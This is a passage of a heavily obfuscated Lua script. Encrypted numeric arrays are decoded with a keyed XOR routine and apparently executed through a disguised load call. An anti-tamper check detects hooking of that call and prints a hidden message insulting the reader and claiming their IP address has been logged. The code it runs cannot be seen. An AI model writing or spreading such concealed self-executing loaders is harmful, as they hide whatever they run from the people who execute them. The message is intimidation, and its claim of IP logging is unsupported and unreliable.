  954, 1020, 1051, 709, 690, 1131, 1055, 1142, 1101, 883, 802, 1069, 1080, 689, 758, 962, 1123, 953, 1140, 949, 777,
  1066, 1118, 979, 599, 1100, 716, 1039, 734, 794, 781, 866, 593, 812, 1064, 1127, 1186, 654, 717, 1206, 705, 550, 913,
  957, 784, 1175, 730, 896, 1024, 590, 630, 1203, 1128, 1119, 811, 612, 735, 851, 547, 1090, 1145, 649, 1038, 778, 544,
  561, 792, 1005, 1063, 1121, 1168, 1003, 924, 886, 1104, 695, 961, 825, 757, 1052, 1156, 1177, 1040, 693, 1154, 681,
  1198, 880, 737, 894, 999, 884, 736, 1062, 1076, 591, 1105, 966, 930, 915, 740, 945, 619, 914, 1117, 760, 750, 1159,
  1163, 965, 846, 869, 1167, 596, 743, 844, 833, 682, 1211, 861, 586, 939, 579, 546, 556, 580, 1149, 989, 935, 1162, 583,
  902, 677, 663, 634, 1173, 835, 975, 806, 948, 1129, 1153, 929, 1009, 890, 1089, 741, 837, 656, 1178, 1195, 1148, 594,
  1021, 1185, 991, 1176, 1192, 573, 748, 721, 807, 797, 1018, 928, 751, 1143, 859, 897, 1135, 842, 817, 803, 870, 562,
  585, 1007, 651, 1190, 669, 637, 1028, 742, 713, 936, 826, 1074, 714, 899, 1120, 1094, 1193, 800, 1174, 1046, 1201,
  1001, 982, 831, 665, 731, 1188, 852, 877, 1103, 986, -1, 112, 50, 104, 54, 99, 76, 103, 107, 18, 90, 108, 68, 115, 45,
  63, 35, 62, 29, 6, 49, 20, 231, 26, 101, 135, 9, 10, 180, 10, 10, 88, 46, 100, 58, 83, 26, 53, 22, 250, 4, 7, 87, 38,
  103, 43, 16, 4, 93, 25, 150, 99, 69, 66, 44, 249, 34, 19, 27, 63, 201, 54, 85, 91, 29, 4, 45, 102, 118, 49, 18, 94, 54,
  45, 109, 112, 56, 92, 129, 16, 91, 185, 192, 29, 104, 109, 172, 84, 65, 94, 65, 0, 67, 119, 69, 86, 35, 8, 23, 111,
  113, 214, 49, 57, 69, 199, 104, 98, 59, 16, 33, 177, 108, 111, 53, 22, 57, 221, 115, 127, 99, 79, 186, 81, 51, 35, 63,
  86, 64, 124, 38, 87, 55, 130, 58, 80, 160, 99, 59, 116, 26, 98, 106, 84, 121, 39, 189, 120, 30, 104, 124, 111, 61, 28,
  84, 127, 106, 207, 99, 114, 98, 44, 26, 111, 68, 84, 225, 70, 252, 81, 83, 97, 42, 54, 16, 106, 224, 102, 95, 15, 73,
  223, 77, 215, 92, 98, 48, 52, 121, 119, 247, 57, 28, 15, 111, 83, 45, 57, 69, 111, 121, 20, 33, 142, 156, 70, 70, 47,
  86, 98, 86, 1, 112, 32, 116, 83, 111, 22, 97, 119, 104, 208, 7, 62, 210, 244, 44, 104, 74, 19, 34, 226, 107, 148, 85,
  121, 41, 16, 98, 74, 17, 59, 112, 66, 105, 1, 107, 82, 101, 121, 117, 48, 3, 46, 30, 39, 3, 88, 84, 161, 27, 35, 59,
  64, 102, 33, 30, 47, 224, 12, 115, 61, 17, 176, 54, 107, 31, 112, 114, 6, 47, 121, 152, 122, 70, 85, 50, 250, 236, 111,
  70, 41, 116, 99, 38, 86, 33, 61, 14, 75, 111, 52, 98, 111, 55, 86, 33, 4, 92, 61, 83, 74, 120, 9, 225, 243, 17, 108,
  23, 57, 85, 53, 216, 46, 114, 125, 66, 38, 25, 16, 115, 30, 63, 1, 65, 22, 95, 79, 98, 233, 59, 54, 82, 78, 91, 70, 9,
  3, 111, 56, 127, 38, 108, 98, 83, 106, 38, 45, 76, 84, 36, 53, 116, 22, 32, 111, 145, 18, 115, 0, 112, 111, 55, 78,
  102, 49, 83, 91, 84, 41, 42, 41, 49, 49, 16, 113, 102, 106, 121, 98, 199, 47, 42, 81, 88, 47, 100, 26, 84, 100, 64,
  147, 46, 81, 0, 99, 98, 98, 59, 26, 95, 86, 83, 71, 229, 86, 16, 54, 39, 17, 107, 116, 86, 60, 39, 254, 116, 107, 22,
  45, 134, 39, 83, 116, 60, 106, 26, 18, 22, 122, 103, 83, 26, 30, 86, 95, 117, 8, 92, 115, 84, 15, 70, 107, 12, 103, 94,
  106, 212, 104, 114, 33, 99, 44, 5, 113, 87, 82, 97, 79, 121, 121, 180, 76, 2, 31, 94, 70, 40, 18, 19, 26, 3, 52, 227,
  74, 122, 38, 104, 11, 41, 27, 86, 63, 111, 39, 7, 46, 74, 23, 193, 41, 59, 42, 15, 93, 13, 0, 175, 30, 37, 145, 27, 59,
  61, 30, 9, 238, 248, 83, 107, 34, 97, 63, 83, 126, 92, 41, 5, 10, 178, 104, 74, 236, 44, 49, 93, 96, 36, 146, 240, 51,
  250, 95, 43, 40, 112, 107, 61, 3, 41, 5, 106, 124, 0, 110, 76, 42, 115, 102, 70, 11, 71, 52, 106, 8, 222, 168, 60, 102,
  63, 52, 98, 59, 62, 22, 69, 36, 48, 23, 69, 111, 29, 75, 41, 72, 31, 83, 9, 42, 63, 101, 173, 82, 171, 226, 112, 110,
  112, 189, 32, 83, 114, 40, 21, 31, 121, 23, 35, 119, 42, 108, 99, 164, 23, 27, 37, 72, 101, 5, 42, 74, 40, 65, 77, 47,
  36, 34, 53, 108, 21, 69, 11, 98, 83, 108, 44, 182, 61, 107, 2, 109, 84, 19, 83, 97, 107, 15, 10, 105, 97, 98, 92, 61,
  101, 88, 102, 27, 62, 38, 3, 115, 56, 22, 82, 28, 37, 98, 54, 46, 37 }, "xfjOCTFBsLJrOKOvPBYse23SsA"); yoLODLY2NjNU9OwouMkX8FoEFP6mH3QhrcseOIZjeUb7H6jYj0p67IlP =
omxollQ1x9ekMErdf4LJUYSksEAA3ba0yb4A7Pf2V0UQFfvDwDR602a9GUiAIK; yTg7XxMc4dqUhtc9Po6u6eiLuny0YK4pVYXzH7Opk4Adshk9eFzMg =
omxollQ1x9ekMErdf4LJUYSksEAA3ba0yb4A7Pf2V0UQFfvDwDR602a9GUiAIK; b71mk20whOqmrKtMbMRMcSylJrvRrZbensl2YLQ7snTyDvAK9mBEUra =
yTg7XxMc4dqUhtc9Po6u6eiLuny0YK4pVYXzH7Opk4Adshk9eFzMg; nbNwuuUPV7wRie0ioR76pbvSMVEgRirQfHx7OrTssBfirlaaYTQq1cRvoEy18Sc0vB8IVY4zGk =
b71mk20whOqmrKtMbMRMcSylJrvRrZbensl2YLQ7snTyDvAK9mBEUra; gwCRPmBjsZJ0ZNu5wGxIWgBlraLIJObX21yrgA81iy9q546QppynSu5HllX2XM7hxVM0dR =
nbNwuuUPV7wRie0ioR76pbvSMVEgRirQfHx7OrTssBfirlaaYTQq1cRvoEy18Sc0vB8IVY4zGk; k2JUIO1hEfB3JChNnwmLJv5cB0j1zWvLf3HZpVLrfZKer0T06HVoWU5r1334oHDcujx =
gwCRPmBjsZJ0ZNu5wGxIWgBlraLIJObX21yrgA81iy9q546QppynSu5HllX2XM7hxVM0dR; bVhxYavEaExFDNruC7LDTM5duIk1d9neKh8I9jM30q8VIHPAP9RUp4RC0WSxHMPBj3yscX =
k2JUIO1hEfB3JChNnwmLJv5cB0j1zWvLf3HZpVLrfZKer0T06HVoWU5r1334oHDcujx; icjG14T2Tc2UvyoddOca4ML0KRe2tMiKo6A0fDVUctd4XSfNLCpOXMEkpZAIT9 =
bVhxYavEaExFDNruC7LDTM5duIk1d9neKh8I9jM30q8VIHPAP9RUp4RC0WSxHMPBj3yscX; sYSQdRFBXwoyG3Q3zLMiD7a2Y21xBfl8WdZUCzv9t7sgobfPS2zhBGx =
icjG14T2Tc2UvyoddOca4ML0KRe2tMiKo6A0fDVUctd4XSfNLCpOXMEkpZAIT9; uPEogvcRcVwUke7gQae9xTQta3ht7kS7niGWG36r5yM0E4wSyhCd2KlbOhdRl0 =
sYSQdRFBXwoyG3Q3zLMiD7a2Y21xBfl8WdZUCzv9t7sgobfPS2zhBGx; wuqGE9XuN7KtTPEgjzOvdV2pB4NEj0rpICVG6TDFZ9jRuvHJvCt0H3l97J3vgk2rA0vYe =
uPEogvcRcVwUke7gQae9xTQta3ht7kS7niGWG36r5yM0E4wSyhCd2KlbOhdRl0; rA1G823hiBdIoJZ2x9QtrQcJc6WY2KOROFgk991moXZdtNCnfhZ =
wuqGE9XuN7KtTPEgjzOvdV2pB4NEj0rpICVG6TDFZ9jRuvHJvCt0H3l97J3vgk2rA0vYe; yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48 = function(
  a)
  K, F = 7205712153454152, 16384 + 3234; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; nL7RrXXy4NnEXJifSVdM8dYaV1MBDJcv9r4ankgnIRJ5UZXxNcUuQeQxRF3bWftp = function(b)
  co = coroutine.create(b)
  pLXHjDN7JF2wEUjwvEpwdWjToAGg6oLhG50JLFNkwruaRLiTFEDoI = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(pLXHjDN7JF2wEUjwvEpwdWjToAGg6oLhG50JLFNkwruaRLiTFEDoI, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return pLXHjDN7JF2wEUjwvEpwdWjToAGg6oLhG50JLFNkwruaRLiTFEDoI
end; u7ZrXP9Uyfb40q4JA4jT88ozocfAEZgLYO8FAPWLVomocbYi03ty6VH9H9x93w = function(f, g)
  sBCnrSnTQ2R6ifpGN4NrqqF3iZYXyZN6dS0rAXQ2rI9UBhxLIYdjUHg3wTMXY9lzYhCq74U = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; tLaav6pVr5V07a8EljEP2Yage2u3Rf03ZrKOjC344tnXSYFIWW3kqbLbzO4T3OSG1 = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; opYA9bJ7kLuIHYZc5BNx5XRJ1AETmBL2ecEEDMrMHep1VsfzjHMI6bgiwN = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      sBCnrSnTQ2R6ifpGN4NrqqF3iZYXyZN6dS0rAXQ2rI9UBhxLIYdjUHg3wTMXY9lzYhCq74U(f[i], string.byte(g, j),
        function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; fyJLDQTORbLQ4dCr2CPx0IK4kUhcfSiDJN9G1xFNqxXt0417x1FUMXGqyQdh = function(p, n)
    prLyqQ68domnBp9pd08Rh11rBjBOVGSqykChPBdnBxX13y4FGM2nXMKrP9MOrMKVbh = ""
    for k, q in pairs(p) do prLyqQ68domnBp9pd08Rh11rBjBOVGSqykChPBdnBxX13y4FGM2nXMKrP9MOrMKVbh =
      prLyqQ68domnBp9pd08Rh11rBjBOVGSqykChPBdnBxX13y4FGM2nXMKrP9MOrMKVbh ..
      rA1G823hiBdIoJZ2x9QtrQcJc6WY2KOROFgk991moXZdtNCnfhZ
      [yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('73') .. yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('78') .. yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('6E') .. yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('41') .. yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('5A') .. yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('37')]
      [yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('23') .. yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('3C') .. yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('19') .. yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('6E')](
      q) end
    ; n(prLyqQ68domnBp9pd08Rh11rBjBOVGSqykChPBdnBxX13y4FGM2nXMKrP9MOrMKVbh)
  end; tLaav6pVr5V07a8EljEP2Yage2u3Rf03ZrKOjC344tnXSYFIWW3kqbLbzO4T3OSG1(f,
    function(r) opYA9bJ7kLuIHYZc5BNx5XRJ1AETmBL2ecEEDMrMHep1VsfzjHMI6bgiwN(r, g,
        function(s) fyJLDQTORbLQ4dCr2CPx0IK4kUhcfSiDJN9G1xFNqxXt0417x1FUMXGqyQdh(s,
            function(t) if #nL7RrXXy4NnEXJifSVdM8dYaV1MBDJcv9r4ankgnIRJ5UZXxNcUuQeQxRF3bWftp(rA1G823hiBdIoJZ2x9QtrQcJc6WY2KOROFgk991moXZdtNCnfhZ[yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('50') .. yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('5F') .. yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('19') .. yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('28')]) == 1 then if rA1G823hiBdIoJZ2x9QtrQcJc6WY2KOROFgk991moXZdtNCnfhZ[yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('50') .. yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('5F') .. yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('19') .. yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('28')] == rA1G823hiBdIoJZ2x9QtrQcJc6WY2KOROFgk991moXZdtNCnfhZ[yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('64') .. yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('6E') .. yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('41') .. yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('5A') .. yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('78')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if rA1G823hiBdIoJZ2x9QtrQcJc6WY2KOROFgk991moXZdtNCnfhZ[yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('50') .. yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('5F') .. yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('19') .. yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('28')](t) then
                    rA1G823hiBdIoJZ2x9QtrQcJc6WY2KOROFgk991moXZdtNCnfhZ
                        [yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('50') .. yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('5F') .. yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('19') .. yQ6Llg0CfWUZHUqX4d0yBxHcOZXGIcSfzAZi7abhuPYOe5ixxecTjTmJMkoQr48('28')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; u7ZrXP9Uyfb40q4JA4jT88ozocfAEZgLYO8FAPWLVomocbYi03ty6VH9H9x93w(
{ 749, 1211, 891, 1046, 757, 1124, 645, 986, 743, 1012, 1117, 1020, 597, 964, 1086, 1202, 797, 1009, 723, 1006, 549,
  1038, 653, 813, 664, 545, 1160, 767, 1021, 988, 779, 1164, 648, 1169, 949, 546, 956, 1097, 796, 742, 863, 1073, 566,
  801, 829, 1114, 919, 632, 966, 922, 606, 727, 1198, 575, 759, 548, 1143, 1059, 544, 570, 782, 1150, 1176, 883, 587,
  714, 1129, 884, 702, 867, 783, 936, 1161, 1068, 1023, 989, 701, 1165, 907, 647, 776, 572, 942, 905, 1206, 1189, 935,
  811, 1151, 968, 1098, 1075, 1000, 1031, 567, 637, 851, 897, 798, 604, 1040, 694, 1188, 1018, 1044, 871, 1166, 1071,
  700, 584, 864, 1168, 934, 697, 681, 753, 1115, 800, 1005, 773, 990, 626, 923, 1106, 1024, 1153, 835, 1103, 1175, 1010,
  792, 1205, 887, 642, 996, 1126, 945, 1142, 828, 1141, 1092, 711, 969, 633, 1149, 1066, 558, 656, 879, 906, 878, 1019,
  713, 641, 627, 732, 676, 993, 943, 820, 1139, 1057, 688, 1116, 1109, 760, 1033, 1122, 634, 722, 605, 1155, 1183, 564,
  593, 621, 1080, 622, 1159, 937, 825, 1147, 904, 1052, 845, 659, 651, 793, 669, 780, 908, 830, 865, 861, 809, 962, 670,
  1078, 959, 771, 980, 985, 1209, 950, 781, 1025, 841, 888, 1123, 1127, 983, 1055, 921, 869, 615, 1133, 940, 970, 756,
  1119, 1063, 1136, 984, 789, 947, 957, 842, 660, 790, 1076, 806, 695, 663, 683, 925, 821, 729, 979, 1070, 788, 581,
  1184, 1001, 1082, 882, 1017, 876, 704, 699, 1030, 1090, 1051, 818, 777, 1095, 770, 772, 834, 754, 710, 808, 689, 1004,
  752, 673, 618, 1132, 1011, 784, 720, 643, 739, 889, 1191, 1207, 924, 596, 1067, 1204, 675, 586, 955, 751, 746, 600,
  1179, 1047, 612, 1048, 804, 913, 708, 662, 972, 914, 875, 550, 571, 952, 569, 975, 931, 644, 602, 857, 992, 616, 1154,
  1182, 910, 557, 1152, 1028, 1026, 614, 1054, 692, 1104, 705, 640, 1107, 873, 892, 827, 563, 803, 812, 588, 1061, 805,
  1034, 553, 928, 1096, 728, 941, 554, 1190, 833, 709, 1022, 690, 555, 1060, 1157, 858, 1084, 872, 843, 1050, 951, 1027,
  836, 1171, 997, 1056, 1101, 774, 591, 684, 1173, 1125, 1093, 1100, 573, 1088, 655, 978, 608, 1072, 594, 916, 1121, 733,
  762, 707, 791, 920, 719, 1037, 1135, 734, 576, 691, 802, 1195, 551, 635, 822, 794, 785, 866, 948, 823, 1137, 939, 1089,
  961, 1120, 556, 974, 967, 763, 1208, 854, 738, 1015, 917, 730, 787, 628, 1201, 839, 1197, 617, 582, 1079, 589, 819,
  1042, 765, 775, 999, 1043, 1029, 1200, 1013, 1194, 755, 1036, 716, 1045, 667, 561, 944, 747, 562, 1192, 1174, 859, 724,
  601, 680, 1185, 698, 795, 725, 1058, 1110, 850, 973, 712, 909, 740, 1105, 609, 1148, 718, 953, 1016, 744, 1094, 847,
  894, 1212, 786, 1041, 994, 958, 868, 580, 686, 976, 745, 568, 677, 965, 886, 543, 1131, 1156, 1113, 547, 826, 579, 832,
  603, 844, 855, 679, 649, 848, 630, 599, 607, 590, 1193, 764, 918, 761, 1186, 1177, 583, 1140, 849, 674, 552, 1170, 768,
  1081, 652, 1008, 758, 933, 619, 987, 672, 1130, 658, 1210, 885, 915, 901, 1002, 638, 1064, 726, 750, 1138, 636, 1062,
  703, 639, 817, 1091, 1118, 799, 938, 1145, 631, 706, 954, -1, 69, 23, 25, 21, 74, 45, 67, 69, 28, 111, 23, 17, 43, 19,
  67, 36, 13, 62, 60, 67, 42, 107, 42, 118, 113, 84, 121, 47, 15, 110, 28, 162, 15, 104, 245, 193, 51, 27, 1, 9, 76, 19,
  114, 76, 59, 115, 112, 90, 67, 96, 111, 83, 116, 63, 29, 189, 77, 31, 77, 58, 44, 52, 77, 17, 88, 115, 43, 239, 27, 10,
  179, 70, 70, 12, 17, 22, 12, 51, 27, 107, 175, 95, 224, 100, 29, 65, 194, 17, 82, 52, 41, 104, 74, 49, 117, 61, 104,
  100, 77, 60, 0, 56, 6, 190, 22, 24, 78, 38, 127, 55, 27, 117, 18, 42, 121, 59, 105, 82, 155, 86, 92, 82, 87, 128, 50,
  166, 71, 82, 191, 11, 125, 89, 68, 74, 100, 141, 120, 86, 22, 226, 37, 120, 93, 68, 136, 66, 19, 43, 23, 43, 41, 74,
  24, 74, 86, 18, 26, 115, 17, 118, 45, 45, 88, 13, 89, 72, 90, 24, 23, 88, 90, 49, 158, 9, 65, 54, 74, 5, 203, 117, 104,
  84, 39, 88, 20, 78, 66, 32, 210, 74, 86, 121, 165, 190, 69, 59, 26, 17, 54, 121, 36, 60, 85, 30, 10, 27, 114, 100, 11,
  41, 26, 82, 111, 69, 53, 96, 18, 81, 127, 69, 117, 32, 115, 78, 21, 6, 36, 61, 126, 29, 46, 23, 85, 72, 94, 87, 38,
  124, 66, 5, 39, 67, 12, 19, 31, 4, 122, 17, 111, 114, 82, 8, 61, 69, 51, 19, 113, 48, 58, 5, 43, 39, 121, 1, 169, 10,
  125, 183, 5, 25, 4, 180, 56, 239, 117, 46, 18, 98, 14, 93, 60, 2, 22, 122, 29, 26, 42, 81, 102, 55, 30, 15, 11, 74,
  121, 137, 76, 87, 3, 24, 11, 61, 11, 100, 17, 74, 69, 42, 104, 185, 228, 7, 67, 11, 60, 48, 14, 87, 94, 147, 74, 6, 73,
  14, 58, 83, 68, 195, 29, 19, 19, 2, 88, 59, 60, 68, 96, 216, 246, 71, 89, 41, 88, 86, 93, 94, 58, 161, 87, 4, 194, 98,
  87, 11, 16, 191, 12, 181, 18, 160, 5, 95, 26, 76, 8, 89, 6, 15, 35, 225, 55, 66, 90, 78, 58, 55, 68, 121, 96, 6, 96,
  60, 12, 123, 182, 67, 235, 33, 47, 1, 84, 9, 9, 83, 91, 112, 28, 17, 74, 61, 21, 104, 88, 170, 118, 87, 76, 127, 111,
  99, 51, 60, 63, 7, 121, 80, 122, 2, 100, 106, 150, 60, 76, 1, 13, 21, 111, 95, 223, 100, 11, 29, 12, 115, 156, 115, 28,
  121, 68, 226, 30, 74, 15, 41, 60, 102, 70, 118, 4, 94, 79, 8, 201, 115, 118, 106, 84, 87, 31, 43, 140, 92, 26, 10, 59,
  61, 42, 103, 41, 2, 69, 69, 34, 45, 17, 2, 105, 9, 92, 70, 73, 74, 77, 90, 121, 84, 76, 96, 114, 86, 86, 104, 170, 121,
  122, 62, 128, 20, 69, 110, 100, 88, 53, 60, 16, 13, 96, 115, 118, 72, 21, 43, 105, 121, 64, 7, 20, 1, 92, 32, 32, 17,
  80, 51, 53, 103, 236, 54, 40, 82, 122, 40, 121, 62, 178, 125, 23, 68, 53, 94, 238, 4, 8, 27, 117, 31, 26, 121, 74, 12,
  82, 82, 15, 120, 80, 35, 136, 2, 104, 62, 4, 1, 46, 16, 4, 13, 64, 29, 62, 23, 121, 31, 61, 99, 17, 125, 29, 24, 76,
  77, 64, 26, 74, 30, 93, 77, 3, 67, 89, 27, 99, 176, 118, 83, 115, 75, 116, 86, 86, 100, 33, 138, 66, 155, 65, 66, 11,
  24, 0, 31, 82, 54, 107, 111, 84, 251, 86, 17, 6, 159, 33, 7, 74, 91, 5, 33, 104, 121, 122, 227, 78, 1, 85, 2, 100, 127,
  29, 254, 17, 70, 111, 33, 84, 84, 101, 95, 54, 4, 43, 59, 87, 89, 55, 105, 67, 88, 186, 86, 118, 47, 138, 45, 28, 84,
  15, 62, 81, 77, 42, 12 }, "xz2NSutDlveyOYjZVYH7cXnj1m"); dR9DMcTZAgagFCcVD5L1Qh4eazfmysus9dhWbF5XGx8F529L3PfY9wd =
rA1G823hiBdIoJZ2x9QtrQcJc6WY2KOROFgk991moXZdtNCnfhZ; tJ0zCeJO0dJ1TbkQvUUMYDw38xRqIFh5B5IY4EnoPvsDwLUcHNnWWSzMCVVNUDw =
rA1G823hiBdIoJZ2x9QtrQcJc6WY2KOROFgk991moXZdtNCnfhZ; c3qE11F5N6x0aUjOssjk3n3gXLkF3aNP0g74qqqlaQ0Gv8pLmCefWpZyIRIx =
tJ0zCeJO0dJ1TbkQvUUMYDw38xRqIFh5B5IY4EnoPvsDwLUcHNnWWSzMCVVNUDw; ednhglrYRFe1STDFtMauePrAUeCyqkHTtpC5BmrcaxRDseacWXdyDxK2a =
c3qE11F5N6x0aUjOssjk3n3gXLkF3aNP0g74qqqlaQ0Gv8pLmCefWpZyIRIx; cuOVDxEqWhTXKaLDtQlB9cEcRm5N6aiE29aetlbM3c3jxGm1zQ0gABBJulG4vBdQl =
ednhglrYRFe1STDFtMauePrAUeCyqkHTtpC5BmrcaxRDseacWXdyDxK2a; y85eNULdkji4aoCkzzh6Gqw3n2UIEhYyNMauciTvBqN6q4w9hAAueW82dxTNM =
cuOVDxEqWhTXKaLDtQlB9cEcRm5N6aiE29aetlbM3c3jxGm1zQ0gABBJulG4vBdQl; nZfYtmTUiwRqsmgguez1v0SgwcpNR815MmLeNw3tEudcZodkj3QpjHJvIdidHRuXvDHe =
y85eNULdkji4aoCkzzh6Gqw3n2UIEhYyNMauciTvBqN6q4w9hAAueW82dxTNM; b4W13WWCCPBCBr3Y27T617KgMdSPMyEqQ7BgRMPfBZ5Jp5Mi9AabB8tJdlHd4J4Cr1eL55 =
nZfYtmTUiwRqsmgguez1v0SgwcpNR815MmLeNw3tEudcZodkj3QpjHJvIdidHRuXvDHe; fSptmQ6zWGU1bCUKukLB3ZN2GRQnkooGDTcuBKY1ts3YADzrPGT =
b4W13WWCCPBCBr3Y27T617KgMdSPMyEqQ7BgRMPfBZ5Jp5Mi9AabB8tJdlHd4J4Cr1eL55; mezofLclAGoj670YRhWMIXjAhygfaVwpWvxlPZExpdMcNYd0COeahyrAr8LuKRWfhh =
